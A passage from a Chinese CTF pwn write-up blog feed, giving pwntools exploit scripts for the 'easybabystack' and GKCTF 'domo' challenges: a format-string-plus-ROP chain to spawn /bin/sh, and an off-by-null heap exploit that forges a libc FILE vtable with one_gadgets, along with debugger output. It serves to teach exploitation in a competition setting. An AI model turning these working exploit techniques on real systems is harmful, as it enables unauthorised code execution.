leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">        libc.address=leak-0x7fcb248f9690+0x7fcb2488a000</span></span><br><span class="line"><span class="string">        info("leak",leak)</span></span><br><span class="line"><span class="string">        info("libc",libc.address)</span></span><br><span class="line"><span class="string">        sleep(1)</span></span><br><span class="line"><span class="string">        p.recv()</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easybabystack"><a href="#easybabystack" class="headerlink" title="easybabystack"></a>easybabystack</h2><p>这题比赛的时候也没做出来，参考fmyy师傅的题解</p><p> 格式化字符串中 *$连用表示取对应偏移位置的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">p= process(<span class="string">'./main'</span>)</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10001</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'username:'</span>,<span class="string">'%*18$d%5$n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x401512")</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x401733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401731</span></span><br><span class="line">binsh  =<span class="number">0x404090</span></span><br><span class="line">system = <span class="number">0x401110</span></span><br><span class="line">read_got = <span class="number">0x404038</span></span><br><span class="line">gadget_I = <span class="number">0x40172A</span></span><br><span class="line">gadget_Ii = <span class="number">0x401710</span></span><br><span class="line">payload  = <span class="string">'U'</span>*<span class="number">0x118</span></span><br><span class="line">payload += p64(gadget_I)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(gadget_Ii)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">p.recvuntil(<span class="string">'message'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;盲打1-盲打2&quot;&gt;&lt;a href=&quot;#盲打1-盲打2&quot; class=&quot;headerlink&quot; title=&quot;盲打1 盲打2&quot;&gt;&lt;/a&gt;盲打1 盲打2&lt;/h2&gt;&lt;p&gt;都是一个c语言解释器，但是不能用&lt;code&gt;()&lt;/code&gt;来写c语言，也就是不能调用函数，可以用
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/05/24/GKCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/05/24/GKCTF-pwn-writeup/</id>
    <published>2020-05-24T10:04:51.000Z</published>
    <updated>2020-05-28T01:26:57.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="domo"><a href="#domo" class="headerlink" title="domo"></a>domo</h2><p>一道 domo日了一天，最后还是做出来，还是很高兴的</p><p><code>off-by-null</code>漏洞，edit功能有任意地址一字节写入，可以用来伪造堆块的size，<code>malloc_fook</code>和<code>free_hook</code>程序做有限制，然后又有<code>sanbox</code>。但是是在main函数结束的时候才生效的，只要在while循环里面调用<code>onegadget</code>，还是能反弹shell的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x0000000a  <span class="keyword">if</span> (A == mprotect) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0xffffd8b6  <span class="keyword">if</span> (A == 0xffffd8b6) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>一开始的思路是想用 <code>environ</code>来泄露 <code>stack_addr</code>然后再申请堆块到栈上用<code>orw</code>的方式来做</p><p>然后费了好大的劲，泄露出stack的地址了，stack上没有合适的size而且还有麻烦的<code>canary</code></p><p>最后选择伪造 <code>_IO_2_1_stdin_</code>的<code>vtable</code>为heap地址，heap里面存放着<code>onegadget</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdin</span><br><span class="line">$1 = (struct _IO_FILE *) 0x7f991f79b8e0 &lt;_IO_2_1_stdin_&gt;</span><br><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus *) 0x7f991f79b8e0</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539512, </span><br><span class="line">    _IO_read_ptr = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_read_end = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_read_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_end = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x557376e65010 &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 16, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x7f991f79d790 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7f991f79b9c0 &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 113, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f991f79a6e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上是伪造 <code>_IO_file_jumps</code>结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_file_jumps</span><br><span class="line">$3 = &#123;</span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x7f991f4509c0 &lt;_IO_new_file_finish&gt;, </span><br><span class="line">  __overflow = 0x7f991f451730 &lt;_IO_new_file_overflow&gt;, </span><br><span class="line">  __underflow = 0x7f991f4514a0 &lt;_IO_new_file_underflow&gt;, </span><br><span class="line">  __uflow = 0x7f991f452600 &lt;__GI__IO_default_uflow&gt;, </span><br><span class="line">  __pbackfail = 0x7f991f453980 &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class="line">  __xsputn = 0x7f991f4501e0 &lt;_IO_new_file_xsputn&gt;, </span><br><span class="line">  __xsgetn = 0x7f991f44fec0 &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class="line">  __seekoff = 0x7f991f44f4c0 &lt;_IO_new_file_seekoff&gt;, </span><br><span class="line">  __seekpos = 0x7f991f452a00 &lt;_IO_default_seekpos&gt;, </span><br><span class="line">  __setbuf = 0x7f991f44f430 &lt;_IO_new_file_setbuf&gt;, </span><br><span class="line">  __sync = 0x7f991f44f370 &lt;_IO_new_file_sync&gt;, </span><br><span class="line">  __doallocate = 0x7f991f444180 &lt;__GI__IO_file_doallocate&gt;, </span><br><span class="line">  __read = 0x7f991f4501a0 &lt;__GI__IO_file_read&gt;, </span><br><span class="line">  __write = 0x7f991f44fb70 &lt;_IO_new_file_write&gt;, </span><br><span class="line">  __seek = 0x7f991f44f970 &lt;__GI__IO_file_seek&gt;, </span><br><span class="line">  __close = 0x7f991f44f340 &lt;__GI__IO_file_close&gt;, </span><br><span class="line">  __stat = 0x7f991f44fb60 &lt;__GI__IO_file_stat&gt;, </span><br><span class="line">  __showmanyc = 0x7f991f453af0 &lt;_IO_default_showmanyc&gt;, </span><br><span class="line">  __imbue = 0x7f991f453b00 &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>先利用<code>unsortedbin_attack</code>泄露出libc基址和heap地址</p><p>然后 <code>off-by-null</code>溢出修改下一个堆块的 size 为 <code>\x00</code>使得他被修改为释放过的</p><p>通过布局，unlink使得堆块向前合并，造成堆块重叠，<code>fastbin_attack</code> 打<code>vtable</code>,需要用edit功能提前伪造size。</p><p><code>_IO_file_jumps</code>里面全放<code>onegadget</code>然后劫持程序执行流 ，生效的是<code>__xsputn</code>这里的<code>onegadget</code></p><p>看下puts函数的具体实现</p><p>代码来自：<a href="https://code.woboq.org/userspace/glibc/" target="_blank" rel="noopener">glibc</a>/<a href="https://code.woboq.org/userspace/glibc/libio/" target="_blank" rel="noopener">libio</a>/<a href="https://code.woboq.org/userspace/glibc/libio/ioputs.c.html" target="_blank" rel="noopener">ioputs.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  <span class="keyword">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (<span class="built_in">stdout</span>) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (<span class="built_in">stdout</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (<span class="built_in">stdout</span>, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">'\n'</span>, <span class="built_in">stdout</span>) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">  _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里实际上是调用了<code>_IO_sputn</code>这个函数，当然这个<code>_IO_sputn</code>实际上就是一个宏，调用了<code>_IO_2_1_stdout_</code>的vtable中的<code>__xsputn</code>，也就是<code>_IO_new_file_xsputn</code>函数。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">environ=libc.sym[<span class="string">"environ"</span>]</span><br><span class="line">_IO_list_all=libc.address+<span class="number">0x7f97b2172520</span><span class="number">-0x7f97b1dad000</span></span><br><span class="line">io_stdin_vtable=libc.address+<span class="number">0x7f07aec479b0</span><span class="number">-0x7f07ae883000</span></span><br><span class="line">info(<span class="string">"environ"</span>,environ)</span><br><span class="line">info(<span class="string">"io_stdin_vtable"</span>,io_stdin_vtable)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + fake vtable-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(io_stdin_vtable<span class="number">-0x20</span>)) <span class="comment">#1</span></span><br><span class="line">edit(io_stdin_vtable<span class="number">-0x18</span>,<span class="string">"\x71"</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one[<span class="number">2</span>]+libc.address)*<span class="number">19</span>+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">add(<span class="number">0x100</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0xffffffff</span>)+<span class="string">"\x00"</span>*<span class="number">0x10</span>+p64(heap+<span class="number">0x140</span>)) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">free(0)</span></span><br><span class="line"><span class="string">add(0x120,'\x12'*0x100+p64(0x110)+p64(0x70)+p64(io_sdtout-0x43)) #1</span></span><br><span class="line"><span class="string">add(0x68,"\x17"*0x10) #</span></span><br><span class="line"><span class="string">payload='\x01'*0x33+p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+0x8)+ p64(environ+0x8)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x68,payload) #2</span></span><br><span class="line"><span class="string">dbg()</span></span><br><span class="line"><span class="string">leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">rbp=leak-0x7ffc34284dd8+0x7ffc34284ce0</span></span><br><span class="line"><span class="string">info("leak",leak)</span></span><br><span class="line"><span class="string">info("rbp",rbp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h3><p>赛后看了官方的writeup，预期解跟我刚开始的思路差不多，只不过攻击方式不同</p><p>他是先修改<code>_IO_2_1_stdout_</code>来实现泄露stack地址，</p><p>接着改写 <code>_IO_2_1_stdin_</code>来实现向stack上写ROP链</p><p>有一些细节，需要注意到。修改 <code>_IO_2_1_stdout_</code>泄露出栈地址后，<code>puts</code>函数输出的字符不会加换行符了</p><p>具体原因还不清楚，有知道的师傅可以交流一波</p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 